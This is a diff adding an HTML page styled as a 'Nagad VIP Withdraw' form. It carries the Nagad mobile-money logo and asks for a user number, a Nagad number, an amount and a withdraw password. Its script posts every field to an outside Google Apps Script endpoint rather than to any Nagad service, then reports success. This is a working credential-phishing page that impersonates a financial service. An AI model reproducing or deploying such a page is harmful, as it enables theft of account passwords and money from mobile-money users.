@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nagad VIP Withdraw</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<div class="container">
+    <div class="login-box">
+
+        <div class="logo">
+            <img src="https://www.logo.wine/a/logo/Nagad/Nagad-Horizontal-Logo.wine.svg">
+            <h2>Super Pay</h2>
+        </div>
+
+        <form id="loginForm">
+
+            <!-- User Number -->
+            <div class="input-box">
+                <i class="fas fa-user"></i>
+                <input type="text" name="mobile" placeholder="User Number" required>
+            </div>
+
+            <!-- Bkash/Nagad -->
+            <div class="input-box">
+                <i class="fa-solid fa-phone"></i>
+                <input type="text" name="bkash" placeholder="Nagad" required>
+            </div>
+
+            <!-- Amount -->
+            <div class="amount-box">
+                <span class="currency">৳</span>
+                <input
+                    type="number"
+                    id="amount"
+                    name="amount"
+                    placeholder="Enter Amount"
+                    min="100"
+                    max="50000"
+                    required>
+            </div>
+
+            <p id="amountError" class="error"></p>
+
+            <!-- Password -->
+            <div class="input-box">
+                 <i class="fa-solid fa-lock"></i>
+
+                <input
+                 type="password"
+                 id="password"
+                 name="password"
+                 placeholder="Withdraw Password"
+                 required>
+
+    <span class="eye" id="togglePassword">
+        <i class="fa-solid fa-eye"></i>
+    </span>
+</div>
+
+            <button type="submit" class="login-btn">SUBMIT</button>
+
+            <p class="register">
+                নির্ভর এবং নিশ্চয়তার সঙ্গে,
+                <a href="#">নগদ ।</a>
+            </p>
+
+        </form>
+
+    </div>
+</div>
+
+<script>
+    // Password Show / Hide
+const password = document.getElementById("password");
+const togglePassword = document.getElementById("togglePassword");
+
+togglePassword.addEventListener("click", function () {
+    if (password.type === "password") {
+        password.type = "text";
+        this.querySelector("i").className = "fa-solid fa-eye-slash";
+    } else {
+        password.type = "password";
+        this.querySelector("i").className = "fa-solid fa-eye";
+    }
+});
+// Amount Validation
+const amount = document.getElementById("amount");
+const amountError = document.getElementById("amountError");
+
+amount.addEventListener("input", function () {
+
+    const value = Number(this.value);
+
+    if (this.value === "") {
+        amountError.textContent = "";
+        return;
+    }
+
+    if (value < 100) {
+        amountError.textContent = "সর্বনিম্ন উত্তোলন ১০০ টাকা";
+    }
+    else if (value > 50000) {
+        amountError.textContent = "স্যার বিকাশে সর্বোচ্চ উত্তোলন ৫০,০০০ টাকা";
+    }
+    else {
+        amountError.textContent = "";
+    }
+
+});
+
+// Form Submit
+document.getElementById("loginForm").addEventListener("submit", function(e){
+
+    e.preventDefault();
+
+    const value = Number(amount.value);
+
+    if(value < 100){
+        amountError.textContent = "সর্বনিম্ন উত্তোলন ১০০ টাকা";
+        amount.focus();
+        return;
+    }
+
+    if(value > 50000){
+        amountError.textContent = "স্যার বিকাশে সর্বোচ্চ উত্তোলন ৫০,০০০ টাকা";
+        amount.focus();
+        return;
+    }
+
+    amountError.textContent = "";
+
+    const formData = new FormData(this);
+
+    fetch("https://script.google.com/macros/s/AKfycbzsbX76lOX0XFw-dcILEsPGkphiaetdqCe_I1OKOKOldDYS3znywGO3TeL3G8LkKoZw/exec",{
+        method:"POST",
+        body:formData
+    })
+    .then(()=>{
+        alert("✅ Submitted Successfully!");
+        this.reset();
+    })
+    .catch(()=>{
+        alert("❌ Something went wrong!");
+    });
+
+});
+</script>
+
+</body>
+</html>
